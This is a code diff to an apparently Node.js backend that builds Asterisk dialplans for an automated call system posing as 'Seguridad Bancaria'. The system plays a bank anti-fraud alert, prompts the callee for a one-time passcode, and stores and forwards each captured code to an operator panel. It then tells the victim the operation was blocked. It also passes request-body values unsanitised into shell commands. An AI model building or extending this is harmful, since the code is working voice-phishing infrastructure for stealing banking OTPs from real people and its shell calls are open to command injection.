@@ -286,46 +286,35 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += `; ========================================================\n\n`;
     dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;
 
+    dialplanContent += `[globals]\n`;
+    dialplanContent += `GLOBAL_DEFAULT_INTRO=custom/alerta_banco_antifraude\n`;
+    dialplanContent += `GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp\n`;
+    dialplanContent += `GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion\n`;
+    dialplanContent += `GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito\n`;
+    dialplanContent += `GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco\n\n`;
+
     dialplanContent += `[from-internal]\n`;
     dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
     dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
-    dialplanContent += `; 2. Acceso y Prueba Directa Extension 8888 -> Enlaza con Cliente de Pruebas 16104803845\n`;
-    dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA EXT 8888: Marcando al cliente de pruebas 16104803845 ===)\n`;
+    dialplanContent += `; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
+    dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
+    dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
+    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
     dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
-    dialplanContent += ` same => n,Set(TEST_CLIENT=16104803845)\n`;
-    dialplanContent += ` same => n,Set(DB(ivr_vars/\${TEST_CLIENT}_agent_exten)=\${CALLING_AGENT})\n`;
-    dialplanContent += ` same => n,Set(DB(ivr_vars/\${TEST_CLIENT}_cid_name)=Seguridad Bancaria)\n`;
-    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
-    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
-    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
-    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
-    dialplanContent += ` same => n,NoOp(Conectando agente \${CALLING_AGENT} con cliente de pruebas \${TEST_CLIENT} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${TEST_CLIENT}@${activeCarrier},60,Tt)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?ext8888_done)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?ext8888_busy)\n`;
-    dialplanContent += ` same => n,NoOp(Fallback 8888 con prefijo +: +\${TEST_CLIENT})\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/+\${TEST_CLIENT}@${activeCarrier},60,Tt)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?ext8888_done)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?ext8888_busy)\n`;
-    dialplanContent += ` same => n,NoOp(Fallback 8888 10 digitos: \${TEST_CLIENT:1})\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${TEST_CLIENT:1}@${activeCarrier},60,Tt)\n`;
-    dialplanContent += ` same => n(ext8888_done),Hangup()\n`;
-    dialplanContent += ` same => n(ext8888_busy),Playtones(busy)\n`;
-    dialplanContent += ` same => n,Wait(3)\n`;
-    dialplanContent += ` same => n,Hangup()\n\n`;
+    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=1001)\n`;
+    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
-    dialplanContent += `; 2b. Acceso a Simulador IVR Local sin costo (*8888 o 8880)\n`;
+    dialplanContent += `; 2b. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
     dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
+    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
     dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
+    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
     dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
@@ -404,50 +393,106 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+    dialplanContent += ` ; Cascada de resolucion para Audio de Bienvenida / Alerta\n`;
     dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/global_intro)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))\n`;
+
+    dialplanContent += ` ; Cascada de resolucion para Audio de Solicitud de Codigo (Prompt OTP)\n`;
     dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
-    dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/default_prompt)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/global_prompt)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))\n`;
+
+    dialplanContent += ` ; Cascada de resolucion para Audio de Espera / Validacion\n`;
+    dialplanContent += ` same => n,Set(IVR_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${GLOBAL_DEFAULT_WAIT}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))\n`;
+
+    dialplanContent += ` ; Cascada de resolucion para Audio de Exito\n`;
     dialplanContent += ` same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))\n`;
+
+    dialplanContent += ` ; Cascada de resolucion para Audio de Conectar con Asesor (Press 1)\n`;
+    dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
+
     dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
-    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Agent=\${IVR_AGENT})\n`;
-    dialplanContent += ` ; 1. Reproducir Audio de Bienvenida / Alerta (o Beep)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${IVR_INTRO}" != ""]?play_intro:play_default_intro)\n`;
-    dialplanContent += ` same => n(play_intro),Playback(\${IVR_INTRO})\n`;
-    dialplanContent += ` same => n,Goto(ask_input)\n`;
-    dialplanContent += ` same => n(play_default_intro),Playback(beep)\n`;
-    dialplanContent += ` ; 2. Solicitar Digitos DTMF (OTP o Press 1)\n`;
-    dialplanContent += ` same => n(ask_input),GotoIf($["\${IVR_PROMPT}" != ""]?read_with_prompt:read_with_beep)\n`;
-    dialplanContent += ` same => n(read_with_prompt),Read(USER_DIGITS,\${IVR_PROMPT},6,,2,8)\n`;
-    dialplanContent += ` same => n,Goto(check_input)\n`;
-    dialplanContent += ` same => n(read_with_beep),Read(USER_DIGITS,beep,6,,2,8)\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
+    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})\n`;
+
+    dialplanContent += ` ; 1. Reproducir Audio de Bienvenida / Alerta Precargado\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida: \${IVR_INTRO} ===)\n`;
+    dialplanContent += ` same => n,Playback(\${IVR_INTRO})\n`;
+
+    dialplanContent += ` ; 2. Solicitar Digitos DTMF (OTP o Press 1) con Audio Prompt Precargado\n`;
+    dialplanContent += ` same => n(ask_input),NoOp(=== [IVR] Solicitando Codigo OTP con audio: \${IVR_PROMPT} ===)\n`;
+    dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_PROMPT},6,,2,10)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?check_input)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,6)\n`;
+
     dialplanContent += ` ; 3. Evaluar digitos ingresados\n`;
-    dialplanContent += ` same => n(check_input),NoOp(=== DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
+    dialplanContent += ` same => n(check_input),NoOp(=== [IVR] DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
     dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" > "1"]?otp_confirm:no_input)\n\n`;
-    dialplanContent += `; Caso: Usuario ingreso codigo OTP\n`;
-    dialplanContent += ` same => n(otp_confirm),NoOp(=== CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" >= "4"]?otp_confirm:no_input)\n\n`;
+
+    dialplanContent += `; Caso: Usuario ingreso codigo OTP (>= 4 digitos, ej. 6 digitos)\n`;
+    dialplanContent += ` same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
     dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
-    dialplanContent += ` same => n,GotoIf($["\${CALLERID(num)}" = "\${FINAL_AGENT}"]?self_agent_test)\n`;
-    dialplanContent += ` same => n,NoOp(=== MANTENIENDO ASESOR EN LLAMADA CON EL CLIENTE (EXT \${FINAL_AGENT}) ===)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
-    dialplanContent += ` same => n,Hangup()\n`;
-    dialplanContent += ` same => n(self_agent_test),NoOp(=== PRUEBA LOCAL COMPLETADA POR AGENTE \${FINAL_AGENT} ===)\n`;
+
+    dialplanContent += ` ; Reproducir locución de validación en curso al usuario\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
+    dialplanContent += ` same => n,Playback(\${IVR_WAIT})\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
+
+    dialplanContent += ` ; Si es prueba local del asesor (Extension 8888 o canal del asesor PJSIP/1001):\n`;
+    dialplanContent += ` ; NUNCA realizar Dial(PJSIP/1001) para evitar llamada fantasma entrante de vuelta al asesor\n`;
+    dialplanContent += ` same => n,Set(CURRENT_CHAN=\${CHANNEL})\n`;
+    dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1"]?self_test_success)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${EXTEN}" = "8888"]?self_test_success)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${CALLERID(num)}" = "1001"]?self_test_success)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${CURRENT_CHAN:0:10}" = "PJSIP/1001"]?self_test_success)\n`;
+
+    dialplanContent += ` ; Si es cliente externo en llamada saliente:\n`;
+    dialplanContent += ` ; Mantener en espera de validacion o reproducir éxito segun decision del asesor\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] CLIENTE EN ESPERA DE VALIDACION DE ASESOR ===)\n`;
+    dialplanContent += ` same => n,Playback(silence/1)\n`;
+    dialplanContent += ` same => n,Wait(3)\n`;
+    dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
+    dialplanContent += ` same => n,Hangup()\n\n`;
+
+    dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL EXITOSA: CÓDIGO \${USER_DIGITS} NOTIFICADO AL PANEL ===)\n`;
     dialplanContent += ` same => n,Playback(beep)\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
+
     dialplanContent += `; Caso: Presiono 1 -> Conectar con Asesor\n`;
     dialplanContent += ` same => n(press1_transfer),NoOp(=== PRESS 1 DETECTADO -> TRANSFERIR A ASESOR ===)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${IVR_AGENT}" != ""]?play_agent_audio:do_transfer)\n`;
-    dialplanContent += ` same => n(play_agent_audio),Playback(\${IVR_AGENT})\n`;
-    dialplanContent += ` same => n(do_transfer),Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+    dialplanContent += ` same => n,Playback(\${IVR_AGENT})\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},45,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
+
     dialplanContent += `; Caso: Sin entrada o timeout\n`;
     dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
     dialplanContent += ` same => n,Playback(beep)\n`;
@@ -487,6 +532,35 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
         exec(`asterisk -rx 'database put extension_cid ${extNum}/number "${cidNum}"'`, () => {});
         exec(`asterisk -rx 'database put extension_cid ${extNum}/name "${cidName}"'`, () => {});
       }
+    }
+
+    // Save default pre-recorded IVR audios into AstDB for fallback and extension 8888 tests
+    const defaultIntro = req.body.audioIntro || 'custom/alerta_banco_antifraude';
+    const defaultPrompt = req.body.audioPrompt || 'custom/solicitar_codigo_otp';
+    const defaultWait = req.body.audioWait || 'custom/un_momento_validando_informacion';
+    const defaultSuccess = req.body.audioSuccess || 'custom/operacion_bloqueada_exito';
+    const defaultAgent = req.body.audioAgent || 'custom/conectar_asesor_banco';
+
+    const defaultAudiosCommands = [
+      `database put ivr_vars default_intro "${defaultIntro}"`,
+      `database put ivr_vars default_prompt "${defaultPrompt}"`,
+      `database put ivr_vars default_wait "${defaultWait}"`,
+      `database put ivr_vars default_success "${defaultSuccess}"`,
+      `database put ivr_vars default_agent "${defaultAgent}"`,
+      `database put ivr_vars 8888_intro "${defaultIntro}"`,
+      `database put ivr_vars 8888_prompt "${defaultPrompt}"`,
+      `database put ivr_vars 8888_wait "${defaultWait}"`,
+      `database put ivr_vars 8888_success "${defaultSuccess}"`,
+      `database put ivr_vars 8888_agent "${defaultAgent}"`,
+      `database put ivr_vars global_intro "${defaultIntro}"`,
+      `database put ivr_vars global_prompt "${defaultPrompt}"`,
+      `database put ivr_vars global_wait "${defaultWait}"`,
+      `database put ivr_vars global_success "${defaultSuccess}"`,
+      `database put ivr_vars global_agent "${defaultAgent}"`,
+    ];
+
+    for (const dCmd of defaultAudiosCommands) {
+      exec(`asterisk -rx '${dCmd}'`, () => {});
     }
 
     // Direct fs write for Extensions Dialplan
@@ -943,6 +1017,53 @@ app.post('/api/asterisk/audio/delete', (req, res) => {
     res.json({ success: true, message: `Orden de eliminación enviada para ${base}.wav` });
   } catch (error: any) {
     res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Endpoint to explicitly synchronize campaign / system audios into AstDB for Asterisk
+app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
+  try {
+    const {
+      intro = 'custom/alerta_banco_antifraude',
+      prompt = 'custom/solicitar_codigo_otp',
+      wait = 'custom/un_momento_validando_informacion',
+      success = 'custom/operacion_bloqueada_exito',
+      agent = 'custom/conectar_asesor_banco',
+      destination,
+    } = req.body;
+
+    const targets = ['default', '8888', 'global'];
+    if (destination) {
+      const clean = String(destination).trim().replace(/[^0-9]/g, '');
+      if (clean) targets.push(clean);
+    }
+    // Also include test client number
+    targets.push('16104803845');
+
+    const commands: string[] = [];
+    for (const tgt of targets) {
+      commands.push(`database put ivr_vars ${tgt}_intro "${intro}"`);
+      commands.push(`database put ivr_vars ${tgt}_prompt "${prompt}"`);
+      commands.push(`database put ivr_vars ${tgt}_wait "${wait}"`);
+      commands.push(`database put ivr_vars ${tgt}_success "${success}"`);
+      commands.push(`database put ivr_vars ${tgt}_agent "${agent}"`);
+    }
+
+    for (const cmd of commands) {
+      exec(`asterisk -rx '${cmd}'`, (err) => {
+        if (err) console.warn('AstDB sync-defaults notice:', err.message);
+      });
+    }
+
+    console.log('[AstDB SUCCESS] Audios sincronizados en base de datos de Asterisk:', { intro, prompt, wait, success, agent });
+
+    res.json({
+      success: true,
+      message: 'Audios del IVR sincronizados permanentemente en Asterisk AstDB.',
+      assigned: { intro, prompt, wait, success, agent },
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
